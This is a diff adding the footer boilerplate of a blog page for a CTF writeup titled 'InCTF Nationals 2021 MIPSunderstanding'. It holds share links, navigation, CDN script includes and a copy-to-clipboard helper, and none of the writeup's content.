+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/&name=InCTF Nationals 2021 MIPSunderstanding writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://4n0nym4u5.github.io/2022/01/10/MIPSunderstanding/&t=InCTF Nationals 2021 MIPSunderstanding writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    4n0nym4u5
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
